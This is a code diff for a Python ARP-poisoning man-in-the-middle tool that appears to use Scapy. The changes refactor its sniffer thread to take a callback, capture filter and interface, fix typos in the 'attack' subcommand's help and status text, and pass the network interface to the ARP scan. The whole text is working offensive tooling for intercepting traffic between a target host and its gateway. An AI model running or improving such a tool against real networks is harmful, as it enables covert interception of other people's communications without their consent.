@@ -13,7 +13,7 @@ MY_IP = ""
 
 GATEWAY_MAC = ""
 _SRC_DST = {}
-STOP_SNIFF = ""
+STOP_SNIFF = False
 
 
 def arp_scan(ip, interface):
@@ -85,16 +85,17 @@ def sniff_parser(packet):
         print(packet.summary())
 
 
-def sniffer_thread(targetMAC, gatewayMAC):
+def sniffer_thread(callback, filter, iface):
     while not STOP_SNIFF:
         sniff(
-            prn=sniff_parser,
-            filter=f"ip and (ether src {targetMAC} or ether src {gatewayMAC})",
-            count=2
+            prn=callback,
+            filter=filter,
+            count=2,
+            iface=iface
         )
 
 
-def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC):
+def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC, callback, filter, iface):
     global STOP_SNIFF
 
     packets = 0
@@ -104,7 +105,8 @@ def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC):
     set_ip_forwarding(1)
 
     print("[+] Starting Packet Sniff.")
-    sniffer = Thread(target = sniffer_thread, args = (targetMAC, gatewayMAC))
+
+    sniffer = Thread(target = sniffer_thread, args = (callback, filter, iface))
     sniffer.start()
 
     time.sleep(5)
@@ -162,7 +164,7 @@ def main():
     )
 
     attack_subparser = subparsers.add_parser(
-        'attack', help='Perform an ARP poisining MITM attack.'
+        'attack', help='Perform an ARP poisoning MITM attack.'
     )
     attack_subparser.add_argument(
         'target', help='Target IP address.'
@@ -198,7 +200,7 @@ def main():
         else:
             targetMAC = result[0]['MAC']
         
-        result = arp_scan(args.gateway)
+        result = arp_scan(args.gateway, args.interface)
         if not result:
             print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
             sys.exit(1)
@@ -212,8 +214,9 @@ def main():
             targetMAC: gatewayMAC,
         }
 
-        print(f"[+] Performing ARP poisining MITM.")
-        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, MY_MAC)
+        print(f"[+] Performing ARP poisoning MITM.")
+        filter = f"ip and (ether src {targetMAC} or ether src {gatewayMAC})"
+        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, MY_MAC, sniff_parser, filter, args.interface)
 
 
 if __name__ == '__main__':
